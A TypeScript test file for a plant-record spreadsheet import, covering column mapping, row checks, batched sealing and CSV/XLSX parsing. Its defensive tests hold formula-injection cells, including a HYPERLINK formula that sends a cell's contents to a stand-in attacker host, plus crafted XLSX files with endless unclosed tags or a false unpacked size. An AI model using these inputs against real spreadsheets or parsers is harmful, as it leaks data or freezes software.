      'Name,Breeder,Notes,Date\n"  Harbour\n Mist ",,"line 1  \nline 2",03/04/2021\nB,Ann,,25/12/2020\n',
    );
    const m = mapAll(s, { bredByDefault: 'Green Lab' });
    const order = detectDateOrder(s.rows.map((r) => r.cells[3]));
    expect(rowFields(s.rows[0], m, order)).toMatchObject({
      strainName: 'Harbour Mist',
      bredBy: 'Green Lab',
      notes: 'line 1\nline 2',
      dateCreated: '2021-04-03',
    });
    expect(rowFields(s.rows[1], m, order).bredBy).toBe('Ann');
  });

  it('a row’s hash is its sealed values: the same for the record it became, different if anything differs', async () => {
    const s = sheetOf('Name,ID,Species\nA,1,Rubus\n');
    const f = rowFields(s.rows[0], mapAll(s));
    const r = await sealRowRecord(f);
    expect(recordRowHash(r)).toBe(rowHashOf(f));
    expect(rowHashOf({ ...f, notes: 'x' })).not.toBe(rowHashOf(f));
  });
});

// ── Checking ────────────────────────────────────────────────────────────────────────────

describe('checking every row', () => {
  it('row-level messages: no name, too long, too many parents, the same name and ID twice', () => {
    const long = 'x'.repeat(LIMITS.strainName + 1);
    const many = Array.from({ length: LIMITS.parents + 1 }, (_, i) => `P${i}`).join(';');
    const s = sheetOf(`Name,ID,Parents\n,1,\n${long},2,\nA,3,"${many}"\nB,4,\nb,4,\nC,,\nC,,\nD,5,\n`);
    const c = checkRows(s, mapAll(s), { existing: [] });
    const msg = (line: number) => c.rows.find((r) => r.line === line)?.problems.join(' ');
    expect(msg(2)).toBe('No plant name.');
    expect(msg(3)).toBe(
      `The plant name is too long: ${LIMITS.strainName + 1} characters, the most is ${LIMITS.strainName}.`,
    );
    expect(msg(4)).toBe(`Too many parents: ${LIMITS.parents + 1}, the most is ${LIMITS.parents}.`);
    expect(msg(6)).toBe('Same name and ID as row 5.');
    expect(msg(8)).toBe('Same name as row 7, and neither has an ID.');
    expect(c).toMatchObject({ ready: 3, already: 0, problems: 5, blocked: undefined });
  });

  it('a row sealed before is skipped and named; the same name and ID with other details is a problem', async () => {
    const s = sheetOf('Name,ID,Notes\nA,1,same\nB,2,new notes\nC,3,\n');
    const m = mapAll(s);
    const a = await sealRowRecord(rowFields(s.rows[0], m));
    const b = await sealRowRecord({ ...rowFields(s.rows[1], m), notes: 'old notes' });
    const c = checkRows(s, m, { existing: [a, b] });
    expect(c.rows.map((r) => r.status)).toEqual(['already', 'problem', 'ready']);
    expect(c.rows[0]).toMatchObject({ existingId: a.id, existingFingerprint: a.recordFingerprint });
    expect(c.rows[1].problems[0]).toContain(`Already in your records with other details (${b.id})`);
  });

  it('limits for the whole file: rows, the name column, and the size of the set', () => {
    const many = sheetOf(`Name\n${Array.from({ length: MAX_ROWS + 1 }, (_, i) => `P${i}`).join('\n')}\n`);
    expect(checkRows(many, mapAll(many)).blocked).toBe(
      `This file has ${MAX_ROWS + 1} rows. Import up to ${MAX_ROWS} at a time: split the file and import the rest after.`,
    );
    const s = sheetOf('Name,ID\nA,1\n');
    expect(checkRows(s, { ...emptyMapping(), columns: { ...emptyMapping().columns, refId: 1 } }).blocked).toBe(
      'Pick the column that has the plant or line name.',
    );
    const full = Array.from({ length: MAX_SET }, (_, i) => ({ id: `VEIL-${i}`, strainName: `x${i}` }) as StrainRecord);
    expect(checkRows(s, mapAll(s), { existing: full }).blocked).toMatch(/this site shows at most 1000/);
  });
});

// ── Sealing ─────────────────────────────────────────────────────────────────────────────

describe('sealing a row', () => {
  it('the same fields, fingerprint and key binding as logging one plant by hand', async () => {
    const r = await sealRowRecord({
      strainName: 'Harbour Mist',
      refId: 'TC-1',
      taxon: '',
      parents: [{ name: 'A' }, { name: 'B' }],
      bredBy: 'Green Lab',
      dateCreated: '2021-03-14',
      notes: '',
    });
    expect(r).toMatchObject({
      strainName: 'Harbour Mist',
      refId: 'TC-1',
      taxon: undefined,
      breedingMethod: '',
      photoFingerprints: [],
      profile: PLANT_VARIETY_PROFILE,
      licenseIds: [],
    });
    expect(r.id).toMatch(/^VEIL-[0-9A-F]{32}$/);
    expect(r.nonce).toMatch(/^[0-9a-f]+$/);
    expect(await checkIntegrity(r)).toBe('match');
    const k = keysFor(r.id);
    expect(k).toBeDefined();
    expect(r.keyBinding).toBe(bindingForSecret(k!.recordSecret).keyBinding);
  });
});

describe('sealing many rows', () => {
  const sheet = sheetOf(`Name,ID\n${Array.from({ length: 7 }, (_, i) => `Plant ${i},ID-${i}`).join('\n')}\n`);
  const prepared = () => checkRows(sheet, mapAll(sheet), { existing: [] }).rows;

  /** A registry that keeps what it is sent, by id (a save is an upsert per id). */
  const registry = () => {
    const kept = new Map<string, StrainRecord>();
    const sent: string[][] = [];
    const commit: Committer = (batch) => {
      sent.push(batch.map((r) => r.id));
      for (const r of batch) kept.set(r.id, r);
      return Promise.resolve({ stored: batch.map((r) => r.id), refused: [] });
    };
    return { kept, sent, commit };
  };

  it('in batches, with progress, and a second run seals nothing again', async () => {
    const reg = registry();
    const progress: number[] = [];
    // The rows as checked when the import started (the job keeps them, so a rerun sees them as they were).
    const rows = prepared();
    const first = await sealRows(rows, {
      commit: reg.commit,
      batchSize: 3,
      gapMs: 0,
      onProgress: (p) => progress.push(p.done),
    });
    expect(first.stopped).toBeUndefined();
    expect(reg.sent.map((b) => b.length)).toEqual([3, 3, 1]);
    expect(progress).toEqual([0, 3, 6, 7]);
    expect(Object.values(first.outcomes).every((o) => o.state === 'sealed')).toBe(true);
    const again = await sealRows(rows, { commit: reg.commit, batchSize: 3, gapMs: 0 });
    expect(reg.sent).toHaveLength(3); // nothing sent
    expect(again.outcomes).toEqual(first.outcomes);
    // and a fresh check now names them as sealed before
    expect(checkRows(sheet, mapAll(sheet), { existing: [] }).already).toBe(7);
  });

  it('a closed tab (stopped after one batch) picks up where it stopped', async () => {
    const reg = registry();
    let batches = 0;
    const rows = prepared();
    const stopped = await sealRows(rows, {
      commit: (b) => {
        batches++;
        return reg.commit(b);
      },
      batchSize: 3,
      gapMs: 0,
      shouldStop: () => batches >= 1,
    });
    expect(stopped.stopped).toBeDefined();
    expect(reg.kept.size).toBe(3);
    const rest = await sealRows(rows, { commit: reg.commit, batchSize: 3, gapMs: 0 });
    expect(rest.stopped).toBeUndefined();
    expect(reg.kept.size).toBe(7);
    expect(new Set(Object.values(rest.outcomes).map((o) => (o.state === 'sealed' ? o.recordId : '')))).toEqual(
      new Set(reg.kept.keys()),
    );
  });

  it('a batch that may not have landed is sent again as the same records, never as new ones', async () => {
    const reg = registry();
    let fail = true;
    const flaky: Committer = (b) => {
      if (fail) {
        fail = false;
        reg.sent.push(b.map((r) => r.id));
        return Promise.resolve({ stored: [], refused: [], retry: "Couldn't reach VeilCore's server." });
      }
      return reg.commit(b);
    };
    const rows = prepared();
    const first = await sealRows(rows, { commit: flaky, batchSize: 3, gapMs: 0 });
    expect(first.stopped).toMatch(/^Couldn't reach VeilCore's server\. The last 3 rows were kept here/);
    const pending = Object.values(loadLedger().rows).filter((e) => e.state === 'pending');
    expect(pending).toHaveLength(3);
    expect(pending.every((e) => e.record && keysFor(e.recordId))).toBe(true);
    await sealRows(rows, { commit: flaky, batchSize: 3, gapMs: 0 });
    expect(reg.sent[1]).toEqual(reg.sent[0]); // the same three ids again
    expect(reg.kept.size).toBe(7);
  });

  it('a record the registry refuses by id is dropped with its keys, and the row says why', async () => {
    const reg = registry();
    const picky: Committer = (b) => {
      const [no, ...yes] = b;
      void reg.commit(yes);
      return Promise.resolve({ stored: yes.map((r) => r.id), refused: [{ id: no.id, reason: 'that id is taken' }] });
    };
    const out = await sealRows(prepared().slice(0, 2), { commit: picky, batchSize: 5, gapMs: 0 });
    const refused = Object.values(out.outcomes).filter((o) => o.state === 'refused');
    expect(refused).toEqual([{ state: 'refused', reason: 'that id is taken' }]);
    expect(Object.values(loadLedger().rows)).toHaveLength(1);
    expect(Object.keys(JSON.parse(local.get('veilcore.record-keys.v1') ?? '{}') as object)).toHaveLength(1);
  });
});

// ── The results file ────────────────────────────────────────────────────────────────────

describe('the results file', () => {
  it('cells a spreadsheet would run as a formula get an apostrophe; separators and quotes are quoted', () => {
    expect(csvCell('=HYPERLINK("x")', ',')).toBe('"\'=HYPERLINK(""x"")"');
    expect(csvCell('+1', ',')).toBe("'+1");
    expect(csvCell('@SUM', ',')).toBe("'@SUM");
    expect(csvCell('-cmd', ',')).toBe("'-cmd");
    expect(csvCell('-12.5', ',')).toBe('-12.5');
    expect(csvCell('a;b', ';')).toBe('"a;b"');
    expect(csvCell('a;b', ',')).toBe('a;b');
    expect(csvCell('two\nlines', ',')).toBe('"two\nlines"');
  });

  it('every original row, as it was, with its record, fingerprint, check link and result; same separator', async () => {
    const s = sheetOf('Name;ID;Extra\nA;1;keep me\n;2;\nB;3;=1+1\n');
    const c = checkRows(s, mapAll(s), { existing: [] });
    const out = await sealRows(c.rows, {
      commit: (b) => Promise.resolve({ stored: b.map((r) => r.id), refused: [] }),
      gapMs: 0,
    });
    const csv = resultsCsv(
      { headers: s.headers, delimiter: s.delimiter, rows: c.rows, outcomes: out.outcomes },
      'https://test.veilcore.org/',
    );
    expect(csv.startsWith('\uFEFF')).toBe(true);
    const back = parseCsv(csv).rows.filter((r) => r.some(Boolean));
    expect(back[0]).toEqual([
      'Name',
      'ID',
      'Extra',
      'VeilCore record ID',
      'Fingerprint',
      'Check link',
      'Result',
      'DNA report',
    ]);
    const a = out.outcomes[c.rows[0].hash];
    if (a.state !== 'sealed') throw new Error('row A was not sealed');
    expect(back[1]).toEqual([
      'A',
      '1',
      'keep me',
      a.recordId,
      a.recordId && a.fingerprint,
      `https://test.veilcore.org/verify/${a.recordId}?fp=${a.fingerprint}`,
      'Sealed',
      NO_DNA_REPORT,
    ]);
    expect(back[2]).toEqual(['', '2', '', '', '', '', 'Not sealed: No plant name.', '']);
    expect(back[3][2]).toBe("'=1+1");
  });

  it('says which records have no DNA report yet, and how many: none of a new import has one', async () => {
    const s = sheetOf('Name\nA\nB\n\n');
    const c = checkRows(s, mapAll(s), { existing: [] });
    const out = await sealRows(c.rows, {
      commit: (b) => Promise.resolve({ stored: b.map((r) => r.id), refused: [] }),
      gapMs: 0,
    });
    const job = { headers: s.headers, delimiter: s.delimiter, rows: c.rows, outcomes: out.outcomes };
    expect(noDnaReportCount(job)).toBe(2);
    const a = out.outcomes[c.rows[0].hash];
    if (a.state !== 'sealed') throw new Error('row A was not sealed');
    // A report saved to one of them since (on its plant page) is counted and written as saved.
    const has = (id: string) => id === a.recordId;
    expect(noDnaReportCount(job, has)).toBe(1);
    const back = parseCsv(resultsCsv(job, 'https://test.veilcore.org', has)).rows.filter((r) => r.some(Boolean));
    expect(back.map((r) => r[r.length - 1])).toEqual(['DNA report', DNA_REPORT_SAVED, NO_DNA_REPORT]);
    expect(NO_DNA_REPORT).toBe(
      'None yet, so the record is not tied to the plant. Add one on the plant’s page: Get a DNA fingerprint for this plant.',
    );
  });
});

// ── Key date stamps ─────────────────────────────────────────────────────────────────────

describe('the key date stamp queue', () => {
  const now = 1_000_000;
  it('stops on a stamp that may have gone out; otherwise waits as long as it was told, or its words say', () => {
    expect(stampWait(new Error('Lost contact. The transaction WAS sent (tx-9); check it'), now).stopped).toMatch(
      /may already have gone out \(transaction tx-9\)/,
    );
    const told = Object.assign(new Error('no'), { retryAfterSeconds: 120 });
    expect(stampWait(told, now)).toEqual({ pauseUntil: now + 120_000, why: 'other' });
    expect(stampWait(new Error('Your network has used this hour’s free transactions. Try later.'), now)).toEqual({
      pauseUntil: now + 3_600_000,
      why: 'quota',
    });
    expect(stampWait(new Error('This browser has used today’s free anchor calls. Try tomorrow.'), now)).toEqual({
      pauseUntil: now + 6 * 3_600_000,
      why: 'quota',
    });
    expect(stampWait(Object.assign(new Error('x'), { retryAfterSeconds: 1 }), now)).toEqual({
      pauseUntil: now + 60_000,
      why: 'other',
    });
    expect(stampWait('something else', now)).toEqual({ pauseUntil: now + 300_000, why: 'other' });
  });
});

// ── Round 2: the column names' row, safe .xlsx reading, separators, both parents ────────

/** The reviewer's file as Excel's "Save as CSV (UTF-8)" writes it: a title row, a blank row, then the column names. */
const TITLED_CSV = [
  '\uFEFFGreen Valley TC Lab — Accession Register (rev 7),,,,,,,,',
  ',,,,,,,,',
  'Acc. #,Cultivar / Line,Name (JP),Species,Parentage (Mother x Father),Source / Breeder,Date Initiated,Media,Notes',
  'GV-2021-001,Blue Dream,,Cannabis sativa,,Tiny Farm,01/01/2021,MS 1/2,"from clone, ""keeper"" pheno"',
  'GV-2022-002,Sour Diesel,,,Gelato 33 x Mimosa,"Okinawa Gen. 株式会社",2/2/2022,MS 1/2,',
  'GV-2023-003,GG4,青い夢,C. sativa L.,Purple Punch × Apple Fritter,"Chunky Seeds, NJ",03.03.2023,MS 1/2,',
  '',
].join('\r\n');

const HEADER_NAMES = [
  'Acc. #',
  'Cultivar / Line',
  'Name (JP)',
  'Species',
  'Parentage (Mother x Father)',
  'Source / Breeder',
  'Date Initiated',
  'Media',
  'Notes',
];

/** The same register as Excel saves it: the title merged across A1:I1, a blank row 2, shared strings. */
const titledXlsx = () => {
  const strings = ['Green Valley TC Lab — Accession Register (rev 7)', ...HEADER_NAMES, 'GV-2021-001', 'Blue Dream'];
  const si = strings.map((t) => `<si><t>${t.replace(/&/g, '&amp;')}</t></si>`).join('');
  const cols = 'ABCDEFGHI';
  const row3 = HEADER_NAMES.map((_, i) => `<c r="${cols[i]}3" t="s"><v>${i + 1}</v></c>`).join('');
  const sheet =
    '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><dimension ref="A1:I4"/><sheetData>' +
    '<row r="1" spans="1:9" ht="18.75"><c r="A1" s="1" t="s"><v>0</v></c><c r="B1" s="1"/><c r="C1" s="1"/><c r="I1" s="1"/></row>' +
    '<row r="2" spans="1:9"/>' +
    `<row r="3" spans="1:9">${row3}</row>` +
    '<row r="4" spans="1:9"><c r="A4" t="s"><v>10</v></c><c r="B4" t="s"><v>11</v></c><c r="G4" s="2"><v>44197</v></c></row>' +
    '</sheetData><mergeCells count="1"><mergeCell ref="A1:I1"/></mergeCells></worksheet>';
  return zipSync(
    Object.fromEntries(
      Object.entries({
        'xl/workbook.xml':
          '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="r"><sheets><sheet name="Register" sheetId="1" r:id="rId1"/></sheets></workbook>',
        'xl/_rels/workbook.xml.rels':
          '<Relationships><Relationship Id="rId1" Target="worksheets/sheet1.xml"/></Relationships>',
        'xl/sharedStrings.xml': `<sst>${si}</sst>`,
        'xl/styles.xml':
          '<styleSheet><cellXfs count="3"><xf numFmtId="0"/><xf numFmtId="0"/><xf numFmtId="14"/></cellXfs></styleSheet>',
        'xl/worksheets/sheet1.xml': sheet,
      }).map(([k, v]) => [k, strToU8(v)]),
    ),
  );
};

describe('which row has the column names', () => {
  it('"Save as CSV" with a title row and a blank row: the column names are row 3, and no title is sealed', async () => {
    const s = await readSheet(fileOf(TITLED_CSV, 'accessions.csv'));
    expect(s.headerLine).toBe(3);
    expect(s.headers).toEqual(HEADER_NAMES);
    expect(s.rows.map((r) => r.line)).toEqual([4, 5, 6]);
    const m = guessMapping(s.headers);
    expect(m.columns).toMatchObject({ refId: 0, strainName: 1, taxon: 3, parents: 4, parents2: null, bredBy: 5 });
    const c = checkRows(s, m, { existing: [] });
    expect(c.headerRows).toEqual([]);
    expect(c.ready).toBe(3);
    expect(c.rows.map((r) => r.fields.strainName)).toEqual(['Blue Dream', 'Sour Diesel', 'GG4']);
    expect(c.rows[1].fields.parents).toEqual([{ name: 'Gelato 33' }, { name: 'Mimosa' }]);
  });

  it('an Excel file whose title is merged across the columns: the same', async () => {
    const s = await readSheet(fileOf(titledXlsx(), 'accessions.xlsx'));
    expect(s.kind).toBe('xlsx');
    expect(s.headerLine).toBe(3);
    expect(s.headers).toEqual(HEADER_NAMES);
    expect(s.rows).toHaveLength(1);
    expect(s.rows[0].cells.slice(0, 2)).toEqual(['GV-2021-001', 'Blue Dream']);
    expect(s.rows[0].cells[6]).toBe('2021-01-01');
    expect(s.raw.map((r) => r.line)).toEqual([1, 3, 4]); // what the "Which row" step offers
  });

  it('a row picked by hand; with the title taken as the column names, the real ones are refused, not sealed', async () => {
    const s = await readSheet(fileOf(TITLED_CSV, 'accessions.csv'));
    const wrong = withHeaderRow(s, 1);
    expect(wrong.headerLine).toBe(1);
    expect(wrong.rows.map((r) => r.line)).toEqual([3, 4, 5, 6]);
    // Only the name column picked, by hand: the row of column names is still caught.
    const m: Mapping = { ...emptyMapping(), columns: { ...emptyMapping().columns, strainName: 1 } };
    const c = checkRows(wrong, m, { existing: [] });
    expect(c.headerRows).toEqual([3]);
    expect(c.rows[0]).toMatchObject({ line: 3, status: 'problem' });
    expect(c.rows[0].problems[0]).toMatch(/looks like column names, not a plant/);
    expect(c.ready).toBe(3);
    // Back to the right row: nothing refused.
    const right = withHeaderRow(wrong, 3);
    expect(right.headers).toEqual(HEADER_NAMES);
    expect(checkRows(right, guessMapping(right.headers), { existing: [] }).headerRows).toEqual([]);
  });

  it('the column names again further down (two exports pasted together) are refused too', () => {
    const s = sheetOf('Name,ID,Notes\nA,1,\nName,ID,Notes\nB,2,\n');
    const c = checkRows(s, mapAll(s), { existing: [] });
    expect(c.headerRows).toEqual([3]);
    expect(c.ready).toBe(2);
  });

  it('plants with ordinary names are never taken for column names', () => {
    const s = sheetOf(
      'Name,ID,Parents,Notes\nPlant 1,ID-1,Mother x Father,from clone\nMother Line,TC-2,,selection notes\n',
    );
    const c = checkRows(s, mapAll(s), { existing: [] });
    expect(c.headerRows).toEqual([]);
    expect(c.ready).toBe(2);
  });

  it('column names it doesn’t know: the first row about as wide as the table; one column: the first row', async () => {
    const s = await readSheet(fileOf('Inventar 2024\nKultivar;Art;Herkunft;Datum\nA;B;C;D\n', 'x.csv'));
    expect(s.headerLine).toBe(2);
    expect(s.headers).toEqual(['Kultivar', 'Art', 'Herkunft', 'Datum']);
    const one = await readSheet(fileOf('Plants\nA\nB\n', 'x.csv'));
    expect(one.headerLine).toBe(1);
    expect(one.rows).toHaveLength(2);
  });
});

/** An .xlsx with this sheet XML (and an optional lie about the sheet's unpacked size). */
const sheetXlsx = (sheet: string, statedSize?: number) => {
  const z = zipSync(
    {
      'xl/workbook.xml': strToU8('<workbook><sheets><sheet name="a" r:id="rId1"/></sheets></workbook>'),
      'xl/_rels/workbook.xml.rels': strToU8(
        '<Relationships><Relationship Id="rId1" Target="worksheets/sheet1.xml"/></Relationships>',
      ),
      'xl/worksheets/sheet1.xml': strToU8(sheet),
    },
    { level: 9 },
  );
  if (statedSize !== undefined) {
    // The size in the local header and in the central directory, as the reviewer's file did.
    const dv = new DataView(z.buffer, z.byteOffset, z.byteLength);
    const name = strToU8('xl/worksheets/sheet1.xml');
    const named = (at: number, len: number) => len === name.length && name.every((b, j) => z[at + j] === b);
    for (let i = 0; i < z.length - 4; i++) {
      const sig = dv.getUint32(i, true);
      if (sig === 0x04034b50 && named(i + 30, dv.getUint16(i + 26, true))) dv.setUint32(i + 22, statedSize, true);
      if (sig === 0x02014b50 && named(i + 46, dv.getUint16(i + 28, true))) dv.setUint32(i + 24, statedSize, true);
    }
  }
  return z;
};

const timed = <T>(f: () => T): [T | Error, number] => {
  const t = performance.now();
  try {
    return [f(), performance.now() - t];
  } catch (e) {
    return [e as Error, performance.now() - t];
  }
};

describe('reading an .xlsx safely', () => {
  it('unclosed tags (the reviewer’s 1.4 KB file froze the tab) are read in one pass', () => {
    // 40,000 unclosed rows took 5.6 s before (and grew with the square); 400,000 now take well under that.
    const [, rowsMs] = timed(() =>
      parseXlsx(sheetXlsx(`<worksheet><sheetData>${'<row r="1">'.repeat(400_000)}</sheetData></worksheet>`)),
    );
    expect(rowsMs).toBeLessThan(3000);
    for (const inner of [
      '<row r="1"><c r="A1">'.repeat(100_000),
      `<row r="1"><c r="A1" t="inlineStr"><is>${'<t>'.repeat(200_000)}</is></c></row>`,
      `<row r="1"><c r="A1"><v>1</v>${'<v>'.repeat(200_000)}</c></row>`,
      `<row r="1" ${'a='.repeat(200_000)}><c r="A1"><v>1</v></c></row>`,
      `<row r="1"><c r="A1" t="inlineStr"><is>${'<rPh>'.repeat(200_000)}<t>x</t></is></c></row>`,
    ]) {
      const [, ms] = timed(() => parseXlsx(sheetXlsx(`<worksheet><sheetData>${inner}</sheetData></worksheet>`)));
      expect(ms).toBeLessThan(3000);
    }
  });

  it('well-formed rows still read as before around a broken one', () => {
    const rows = parseXlsx(
      sheetXlsx(
        '<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>' +
          '<row r="2"><c r="A2" t="inlineStr"><is><t>Harbour Mist</t></is></c></row><row r="3"><c r="A3"></sheetData></worksheet>',
      ),
    );
    expect(rows).toEqual([
      { line: 1, cells: ['Name'] },
      { line: 2, cells: ['Harbour Mist'] },
    ]);
  });

  it('a sheet longer than the zip says is read only to the stated size, and that is said', async () => {
    const body = Array.from(
      { length: 2000 },
      (_, i) => `<row r="${i + 2}"><c r="A${i + 2}" t="inlineStr"><is><t>Plant ${i}</t></is></c></row>`,
    ).join('');
    const xml = `<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>${body}</sheetData></worksheet>`;
    const s = await readSheet(fileOf(sheetXlsx(xml, 1000), 'lies.xlsx'));
    expect(s.warnings.join(' ')).toMatch(/damaged or cut short, so only the first part of the sheet was read/);
    expect(s.rows.length).toBeGreaterThan(0);
    expect(s.rows.length).toBeLessThan(20);
    // An honest file says nothing of the kind.
    expect((await readSheet(fileOf(sheetXlsx(xml), 'ok.xlsx'))).warnings).toEqual([]);
    // A stated size over the cap is refused before anything is unpacked.
    await expect(readSheet(fileOf(sheetXlsx(xml, 64 * 1024 * 1024), 'big.xlsx'))).rejects.toThrow(/too large/);
  });

  it('stops after the rows an import can take, and the file is named as too long, not counted wrong', async () => {
    const body = Array.from(
      { length: 900 },
      (_, i) => `<row r="${i + 2}"><c r="A${i + 2}" t="inlineStr"><is><t>Plant ${i}</t></is></c></row>`,
    ).join('');
    const s = await readSheet(
      fileOf(
        sheetXlsx(
          `<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Name</t></is></c></row>${body}</sheetData></worksheet>`,
        ),
        'long.xlsx',
      ),
    );
    expect(s.moreRows).toBe(true);
    expect(s.rows.length).toBeLessThan(MAX_ROWS + 20);
    expect(tooManyRows(s)).toBe(
      `This file has more than ${MAX_ROWS} rows. Import up to ${MAX_ROWS} at a time: split the file and import the rest after.`,
    );
    expect(checkRows(s, mapAll(s), { existing: [] }).blocked).toBe(tooManyRows(s));
  });

  it(`reads at most ${MAX_COLUMNS} columns, and says so`, async () => {
    const wide = Array.from({ length: 150 }, (_, i) => `H${i}`);
    const s = await readSheet(fileOf(`Name,${wide.join(',')}\nA,${wide.join(',')}\n`, 'wide.csv'));
    expect(s.headers).toHaveLength(MAX_COLUMNS);
    expect(s.rows[0].cells).toHaveLength(MAX_COLUMNS);
    expect(s.warnings.join(' ')).toMatch(new RegExp(`Only the first ${MAX_COLUMNS} columns are read`));
    // Picking another row doesn't say it twice.
    expect(withHeaderRow(s, 1).warnings).toHaveLength(1);
  });
});

describe('separators and parents, round 2', () => {
  it('a "sep=" line names only a comma, semicolon, tab or bar; "sep==" is dropped, so no results line starts with "="', () => {
    const p = parseCsv('sep==\nNotes=Name\n=HYPERLINK("https://evil.example/?"&B1;"Open")\n');
    expect(p.delimiter).not.toBe('=');
    expect(p.rows[0]).toEqual(['Notes=Name']);
    const s = toSheet(
      p.rows.map((cells, i) => ({ line: i + 2, cells })),
      'csv',
      p.delimiter,
    );
    const c = checkRows(
      s,
      { ...emptyMapping(), columns: { ...emptyMapping().columns, strainName: 0 } },
      { existing: [] },
    );
    const out = resultsCsv(
      { headers: s.headers, delimiter: s.delimiter, rows: c.rows, outcomes: {} },
      'https://veilcore.org',
    );
    for (const line of out.replace(/^\uFEFF/, '').split('\r\n')) expect(line.startsWith('=')).toBe(false);
    for (const [line, d] of [
      ['sep=|\nName|ID\nA|1\n', '|'],
      ['sep=\t\nName\tID\n', '\t'],
      ['sep=;\nName;ID\n', ';'],
      ['sep=,\nName,ID\n', ','],
      ['sep="\nName,ID\n', ','],
    ])
      expect(parseCsv(line).delimiter).toBe(d);
  });

  it('a column naming both parents is the parents column; one naming the father alone is the second parent', () => {
    expect(guessMapping(['Name', 'Parentage (Mother x Father)']).columns).toMatchObject({ parents: 1, parents2: null });
    expect(guessMapping(['Name', 'Female x Male']).columns).toMatchObject({ parents: 1, parents2: null });
    expect(guessMapping(['Name', 'Dam / Sire', 'Father']).columns).toMatchObject({ parents: 1, parents2: 2 });
    expect(guessMapping(['Name', 'Mother', 'Father']).columns).toMatchObject({ parents: 1, parents2: 2 });
  });
});

describe('key date stamps: the rate and the words', () => {
  it('about 3 a day from one browser: 119 take about 40 days', () => {
    expect(KEY_STAMPS_PER_DAY).toBe(3);
    expect(keyStampDays(119)).toBe(40);
    expect(keyStampDays(1)).toBe(1);
  });

  it('a fee service it couldn’t reach is said as that, not as "waiting for the fee service"', () => {
    const now = 1_000_000;
    const unreachable = Object.assign(new Error('The sponsor is not answering. Try again in a few minutes.'), {
      code: 'unreachable',
    });
    expect(stampWait(unreachable, now).why).toBe('unreachable');
    expect(stampWait(new TypeError('Failed to fetch'), now).why).toBe('offline');
    expect(
      stampWait(new Error('Could not reach the Midnight network or the sponsor. Nothing was sent. Try again.'), now)
        .why,
    ).toBe('offline');
    expect(stampPauseWords('offline', '3 PM')).toBe(
      "Couldn't reach the network or the fee service; trying again later. Next try: 3 PM.",
    );
    expect(stampWait(Object.assign(new Error('Too many'), { code: 'rate', status: 429 }), now).why).toBe('quota');
    expect(stampPauseWords('unreachable', '3 PM')).toBe(
      "Couldn't reach the fee service; trying again later. Next try: 3 PM.",
    );
    expect(stampPauseWords('quota', '3 PM')).toMatch(/^The free key stamps are used up for now/);
    expect(stampPauseWords(undefined, '3 PM')).toMatch(/^A key stamp didn't go through/);
  });

  it('the records an import made are known after the job is gone (Home says their key stamps are queued)', async () => {
    const s = sheetOf('Name\nA\nB\n');
    await sealRows(checkRows(s, mapAll(s), { existing: [] }).rows, {
      commit: (b) => Promise.resolve({ stored: b.map((r) => r.id), refused: [] }),
      gapMs: 0,
    });
    const ids = importedRecordIds();
    expect(ids).toHaveLength(2);
    expect(ids.every((id) => /^VEIL-/.test(id))).toBe(true);
  });
});
